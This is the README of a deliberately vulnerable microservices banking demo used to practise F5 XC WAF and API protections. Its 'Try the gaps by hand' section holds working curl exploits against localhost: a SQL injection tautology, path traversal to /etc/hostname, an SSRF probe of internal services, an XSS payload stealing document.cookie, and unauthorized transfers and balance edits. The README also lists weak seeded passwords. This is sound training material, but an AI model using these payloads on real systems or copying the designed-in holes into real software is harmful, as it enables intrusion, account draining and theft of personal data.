# NimbusBank

A deliberately-vulnerable fintech demo app, built to practice F5 Distributed
Cloud (F5 XC) WAF and API Security features against: JWT validation at the
edge, OpenAPI schema validation, rate limiting, and bot/malicious-user
detection. **Phase 0 + Phase 1 are done** — three independent FastAPI
microservices (auth, accounts, transfers), each owning its own Postgres
database, fronted by a single Nginx gateway that also serves the React SPA.
No rate limiting, no WAF, no schema enforcement anywhere — on purpose. Next
up: point F5 XC at the gateway and layer those in.

Unlike [VulnCart](../vulncart) (a monolith bot-defense demo), NimbusBank is a
true microservices split — three separate FastAPI services, three separate
Postgres databases, **no cross-service database access, ever**. Services
that need to trust something about a request (who the caller is) do it the
way F5 XC itself does: by validating a JWT's signature against a JWKS
endpoint, not by reaching into another service's tables.

## What's intentionally missing

Every deliberate gap is marked in the code with `INTENTIONALLY VULNERABLE`
comments. Grep for it:

```bash
grep -rn "INTENTIONALLY VULNERABLE" services/
```

Summary, mapped to F5 XC's attack/feature categories:

| Gap | Where | F5 XC category |
|---|---|---|
| Instant verified account, no email confirmation/CAPTCHA/signup limit | `services/auth/app/main.py` (`register`) | Bot Protection: Fake Accounts |
| No rate limit/lockout on login; "no such user" vs "wrong password" | `services/auth/app/main.py` (`login`) | Bot Protection: Credential Stuffing / account enumeration |
| No rate limit/attempt cap on OTP verification (4-digit keyspace) | `services/auth/app/main.py` (`verify_otp`) | Bot Protection: OTP Bruteforce |
| BOLA — no ownership check, sequential integer ids | `services/accounts/app/main.py` (`get_account`) | API Security: Broken Object Level Authorization |
| Excessive data exposure — full SSN + DOB returned | `services/accounts/app/main.py` (`get_account`) | API Security: Sensitive Data Exposure |
| Mass assignment on `balance_cents` + no ownership check | `services/accounts/app/main.py` (`update_account`) | API Security: Mass Assignment + BOLA |
| SQL injection — f-string built into raw SQL | `services/accounts/app/main.py` (`search_accounts`) | WAF / OWASP Top 10: SQL Injection |
| Path traversal — unsanitized `file` query param | `services/accounts/app/main.py` (`get_statement`) | API Security / WAF: Path Traversal |
| SSRF — server fetches a fully attacker-controlled URL | `services/accounts/app/main.py` (`link_external_account`) | API Security / WAF: Server-Side Request Forgery |
| BOLA — no check `from_account_id` belongs to caller (now *really* drains the target account via `/internal/apply-transfer`) | `services/transfers/app/main.py` (`create_transfer`) + `services/accounts/app/main.py` (`apply_transfer`) | API Security: BOLA / business-logic flaw |
| No amount validation (negative allowed), no daily limit, no rate limit | `services/transfers/app/main.py` (`create_transfer`) | API Security / Bot Protection: unthrottled business logic |
| BOLA — `GET /transfers?account_id=` has no ownership check | `services/transfers/app/main.py` (`list_transfers`) | API Security: Broken Object Level Authorization |
| Stored XSS — `memo` rendered via `dangerouslySetInnerHTML` | `services/transfers/app/models.py` + `frontend/src/pages/TransactionHistory.jsx` | WAF / OWASP Top 10: Stored XSS |
| BFLA — admin-only route uses `get_current_user`, not `require_admin` | `services/transfers/app/main.py` (`admin_override`) | API Security: Broken Function Level Authorization |
| No `limit_req` zone anywhere | `gateway/nginx.conf` | Unthrottled surface for every endpoint above |

What's **not** intentionally broken: passwords are bcrypt-hashed, access
tokens are RS256-signed and verified against a real JWKS (not just decoded
blindly), most queries are parameterized via SQLAlchemy (the one exception
is clearly marked), and money amounts are stored as integer cents. The gaps
above are specifically the OWASP API Security Top 10 / WAF-relevant gaps F5
XC is built to catch — not an exhaustive appsec audit.

A note on the two kinds of comment in this codebase: `INTENTIONALLY
VULNERABLE` marks a real gap you're meant to exploit and later fix with F5
XC. `LAB-ONLY` (e.g. the OTP being echoed back in `/login`'s response body)
marks a convenience that exists purely so you don't need to stand up a mail
server to exercise the flow — it's not a security property and isn't part
of the vulnerability table above.

## Try the gaps by hand

All commands go through the gateway on port 80. Start by registering,
logging in, and completing OTP to get a bearer token:

```bash
# Register
curl -s -X POST http://localhost/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@nimbusbank.io","full_name":"Demo User","password":"password123","ssn_last4":"9999"}'

# Login — grab user_id and otp straight out of the response (LAB-ONLY)
curl -s -X POST http://localhost/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@nimbusbank.io","password":"password123"}'
# => {"otp_required":true,"user_id":"<uuid>","otp":"1234"}

# Verify OTP -> access token
curl -s -X POST http://localhost/api/auth/login/otp/verify \
  -H "Content-Type: application/json" \
  -d '{"user_id":"<uuid-from-above>","otp":"<otp-from-above>"}'
# => {"access_token":"<jwt>", "token_type":"bearer", "user": {...}}

export TOKEN="<jwt-from-above>"
```

Or skip straight to a seeded user (see "Seeded test data" below) — same
`login` → `login/otp/verify` flow with `alice@nimbusbank.io` /
`password123`.

**BOLA — read any account by walking sequential ids** (works for any account
id 1-10 regardless of who you logged in as):

```bash
curl -s http://localhost/api/accounts/accounts/3 -H "Authorization: Bearer $TOKEN" | jq
# full SSN and date of birth come back even for accounts you don't own
```

**Mass assignment — set your own (or anyone's) balance to anything:**

```bash
curl -s -X PATCH http://localhost/api/accounts/accounts/3 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"balance_cents": 999999999}'

curl -s http://localhost/api/accounts/accounts/3 -H "Authorization: Bearer $TOKEN" | jq .balance_cents
# => 999999999
```

**SQL injection — break the query with a single quote, or bypass it entirely:**

```bash
curl -s "http://localhost/api/accounts/accounts/search?q=checking" -H "Authorization: Bearer $TOKEN"

# A bare quote breaks the query (500 Internal Server Error) — proof this is
# raw string concatenation, not a bound parameter.
curl -s -w "\nHTTP %{http_code}\n" "http://localhost/api/accounts/accounts/search?q=%27" \
  -H "Authorization: Bearer $TOKEN"

# The endpoint splices `q` into two ILIKE clauses, so a working bypass needs
# to close the string, force a tautology, and comment out everything after
# it: q = x%' OR '1'='1' --
curl -s "http://localhost/api/accounts/accounts/search?q=x%25%27%20OR%20%271%27%3D%271%27%20--%20" \
  -H "Authorization: Bearer $TOKEN" | jq
# -> every account in the database, full SSNs and all, regardless of "x"
```

**Path traversal — read a file outside the statements/ directory:**

```bash
curl -s "http://localhost/api/accounts/accounts/3/statement?file=statement.csv" \
  -H "Authorization: Bearer $TOKEN"

curl -s "http://localhost/api/accounts/accounts/3/statement?file=../../../../../../etc/hostname" \
  -H "Authorization: Bearer $TOKEN"
# reads a file completely outside services/accounts/app/statements/
```

**SSRF — make the server fetch an arbitrary URL and reflect the response:**

```bash
curl -s -X POST http://localhost/api/accounts/accounts/link-external \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"account_id": 3, "verification_url": "http://accounts:8000/health"}' | jq
# status_code + body_snippet come from wherever verification_url points —
# try other internal service names/ports (auth:8000, transfers:8000) too
```

**BOLA on transfers — move funds out of an account that isn't yours:**

```bash
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 7, "to_account_id": 3, "amount_cents": 500000, "memo": "not my account"}' | jq
```

**Stored XSS — plant a payload in a memo, then view it in the UI's transaction history:**

```bash
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 3, "to_account_id": 5, "amount_cents": 100, "memo": "<img src=x onerror=alert(document.cookie)>"}' 
# then visit http://localhost/accounts/3/history in a browser
```

**BFLA — override a transfer's status as a non-admin customer:**

```bash
curl -s -X POST http://localhost/api/transfers/transfers/admin-override \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"transfer_id": 1, "new_status": "reversed"}' | jq
# succeeds even though $TOKEN belongs to a "customer", not an "admin"
```

## Money movement, FX, and TOTP

These are real features layered on top of the deliberately-vulnerable core —
they make the app behave like an actual bank without softening any of the
gaps above.

### Transfers really move money (and convert currency)

`POST /transfers` now does more than insert a row. After recording the
transfer it calls accounts-service over the internal docker network at
`POST http://accounts:8000/internal/apply-transfer` — the single place a
balance actually changes. That endpoint debits the source account, credits
the (currency-converted) destination, and commits atomically; the returned
conversion details (`currency`, `to_amount_cents`, `to_currency`, `fx_rate`)
are persisted back onto the transfer row. If the accounts call fails the
transfer row is kept and marked `failed` instead of crashing the request.

`/internal/apply-transfer` is **not** exposed through the gateway — it's a
service-to-service call. It deliberately performs **no ownership check** and
enforces **no balance floor** (balances may go negative), inheriting the same
intentional stance as the rest of accounts-service. That's what turns the
transfers-service BOLA into a real drain of someone else's account.

FX is a fixed static table (USD per 1 unit), defined once in
`services/accounts/app/fx.py` and mirrored client-side in
`frontend/src/money.js` purely for the transfer form's live preview — the
server stays authoritative on execution:

| Currency | USD per unit |
|---|---|
| USD | 1.00 |
| EUR | 1.08 |
| GBP | 1.27 |
| JPY | 0.0067 |
| KES | 0.0078 |

Conversion is `to_amount = round(from_amount * fx[from] / fx[to])`, and
`fx_rate` is stored as the effective from→to multiplier.

```bash
# Same-currency transfer (alice's own USD checking 3 -> USD savings 4):
# both balances move by 5000 cents.
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 3, "to_account_id": 4, "amount_cents": 5000, "memo": "same ccy"}' | jq

# Cross-currency (USD acct 3 -> EUR acct 5): 10800 USD cents debited,
# 10000 EUR cents credited (108.00 * 1.00/1.08 = 100.00), fx_rate ~0.9259.
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 3, "to_account_id": 5, "amount_cents": 10800, "memo": "USD->EUR"}' | jq

# Re-GET both accounts to confirm the balances actually changed.
curl -s http://localhost/api/accounts/accounts/3 -H "Authorization: Bearer $TOKEN" | jq .balance_cents
curl -s http://localhost/api/accounts/accounts/5 -H "Authorization: Bearer $TOKEN" | jq .balance_cents
```

### Real TOTP (Google Authenticator), alongside the weak OTP

The weak 4-digit echoed OTP path is untouched — it's a vulnerability and it
stays. On top of it, a user can opt into a real RFC 6238 authenticator-app
second factor from the Security page. Both paths coexist: `POST /login` now
also returns `totp_enabled`, and the frontend routes to the 6-digit
`POST /login/totp/verify` when it's true, or the weak `POST /login/otp/verify`
when it's false.

New auth-service endpoints (all bearer-authenticated except the login-step
ones):

| Endpoint | Purpose |
|---|---|
| `POST /totp/enroll` | Generate a base32 secret (stays unconfirmed) and return `{secret, otpauth_uri, qr_png_base64}` |
| `POST /totp/confirm` | Verify a 6-digit code and flip `totp_enabled` on |
| `POST /totp/disable` | Clear the secret and turn TOTP off |
| `GET /totp/status` | `{totp_enabled}` for the current user |
| `POST /login/totp/verify` | Login step 2 for TOTP users — validates a 6-digit code, issues the same access token + refresh cookie as the OTP path |

```bash
# Enroll (returns the secret + an otpauth:// URI + a base64 PNG QR):
curl -s -X POST http://localhost/api/auth/totp/enroll -H "Authorization: Bearer $TOKEN" | jq '{secret, otpauth_uri}'

# Compute a code from the returned secret and confirm:
CODE=$(python3 -c "import pyotp,sys;print(pyotp.TOTP(sys.argv[1]).now())" "$SECRET")
curl -s -X POST http://localhost/api/auth/totp/confirm -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d "{\"code\":\"$CODE\"}" | jq

# Next login reports totp_enabled=true; finish with /login/totp/verify:
curl -s -X POST http://localhost/api/auth/login/totp/verify -H "Content-Type: application/json" \
  -d "{\"user_id\":\"<uuid>\",\"code\":\"$CODE\"}" | jq
```

## Stack

- **Postgres 16**, one container, five databases: `auth`, `accounts`,
  `transfers` (all in use) plus empty `kyc` and `support` (Phase 2 — see
  Roadmap). Each service connects to exactly one database and never touches
  another's.
- **auth-service** (FastAPI, async SQLAlchemy + asyncpg) — users, login,
  OTP, and JWT/JWKS issuance. The only service holding the RS256 private
  key (2048-bit, generated on first boot, persisted in a docker volume).
- **accounts-service** / **transfers-service** (FastAPI) — validate bearer
  tokens by fetching auth-service's public JWKS over the internal docker
  network; hold no signing key of their own.
- **React** (Vite) — SPA, built and served as static files.
- **Nginx** — single entry point: serves the built frontend and reverse
  proxies `/api/auth/`, `/api/accounts/`, `/api/transfers/` to the three
  services. This is also where F5 XC slots in later — point your XC origin
  pool at this Nginx, no app changes required.

A note on URL shape: each service's own routes already include their
resource name (e.g. accounts-service defines `GET /accounts/{id}`, not just
`GET /{id}`), and the gateway's `/api/accounts/` location strips only the
`/api/accounts/` prefix before proxying. So the full path from a browser is
`/api/accounts/accounts/{id}` — the repeated `accounts` looks odd but is
correct; see `gateway/nginx.conf` and each service's `main.py`.

## Running it

1. Copy the environment file and set a real Postgres password:
   ```bash
   cp .env.example .env
   # edit POSTGRES_PASSWORD in .env — or: 
   sed -i "s/^POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$(openssl rand -hex 16)/" .env
   ```
2. Build and start everything:
   ```bash
   docker compose up -d --build
   ```
3. Check health:
   ```bash
   docker compose ps
   curl http://localhost/api/auth/health
   curl http://localhost/api/accounts/health
   curl http://localhost/api/transfers/health
   ```
4. Visit `http://localhost/` in a browser: register an account (or sign in
   as one of the seeded users below), view your dashboard, open an account,
   send a transfer, and check its transaction history.

Postgres data and the auth-service RSA keypair live in named docker
volumes, untouched by image rebuilds. Tables are created automatically on
each service's startup and only seeded if empty, so re-running `docker
compose up -d --build` never duplicates or loses data.

### Local frontend dev (optional, faster iteration)

```bash
cd frontend
npm install
npm run dev    # http://localhost:5173, proxies /api/* to the services on 8001-8003
```

Run the three services separately for this (each needs its own venv or a
shared one — they don't share dependencies across services):

```bash
cd services/auth
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
export DATABASE_URL=postgresql+asyncpg://nimbusbank:change_me_please@localhost:5432/auth
uvicorn app.main:app --reload --port 8001
```
(Repeat for `services/accounts` on port 8002 and `services/transfers` on
port 8003, each with its own `DATABASE_URL` pointing at `accounts` /
`transfers`. Easiest is `docker compose up db` for a local Postgres with all
five databases already created.)

## Seeded test data

Five auth-service users, all with `is_verified=true` out of the box:

| Email | Password | Role |
|---|---|---|
| admin@nimbusbank.io | admin123 | admin |
| alice@nimbusbank.io | password123 | customer |
| bob@nimbusbank.io | password123 | customer |
| carol@nimbusbank.io | password123 | customer |
| dave@nimbusbank.io | password123 | customer |

Ten accounts (checking + savings per user), ids assigned sequentially by
Postgres so they land at 1-10 on a fresh database. Each user's two accounts
share one currency, so cross-user transfers exercise FX conversion:

| Account id | Owner | Type | Currency |
|---|---|---|---|
| 1 | admin | checking | USD |
| 2 | admin | savings | USD |
| 3 | alice | checking | USD |
| 4 | alice | savings | USD |
| 5 | bob | checking | EUR |
| 6 | bob | savings | EUR |
| 7 | carol | checking | GBP |
| 8 | carol | savings | GBP |
| 9 | dave | checking | JPY |
| 10 | dave | savings | JPY |

Three seeded transfers exist between accounts 3, 5, 7, and 9 so the
transaction history view isn't empty on first load.

All five seeded users stay on the weak echoed-OTP login path out of the box
(`totp_enabled = false`) so the curl flows above keep working. Real
authenticator-app (TOTP) enrollment is opt-in per user via the Security page
in the UI — see "Money movement, FX, and TOTP" below.

The five seeded user ids are fixed UUIDs shared (by hand, as literal
constants) between `services/auth/app/seed.py` and
`services/accounts/app/seed.py` — see the comment at the top of either file.
This is the one place seed data across services has to agree; it's a
seeding convenience only, not a runtime dependency between the databases.

## Roadmap

1. ~~auth-service: register/login/OTP/JWT+JWKS~~ — done
2. ~~accounts-service: balances, BOLA, mass assignment, SQLi, path traversal, SSRF~~ — done
3. ~~transfers-service: money movement, BOLA, stored XSS, BFLA~~ — done
4. ~~React frontend + Nginx gateway~~ — done
5. **Phase 2:** `kyc-service` and `support-service` (databases already
   created, empty, by `postgres/init-multi-db.sh`), plus a walkthrough of
   uploading each service's `/openapi.json` to F5 XC's API schema
   validation feature.
6. **Phase 3:** bot scripts against `/login`, `/login/otp/verify`, and
   `/register` (plain HTTP + a headless-browser variant), similar in spirit
   to VulnCart's `vulncart-bots/`.
7. **Phase 4:** a malware/malicious-file-upload demo (likely attached to
   `support-service` once it exists).
8. **Phase 5:** client-side defense / formjacking demo against the React
   frontend.
9. **Phase 6:** an aggregated admin dashboard across all services.
10. **Phase 7:** split across multiple environments for a realistic
    multi-environment F5 XC deployment (e.g. separate XC namespaces for
    auth vs. accounts/transfers).
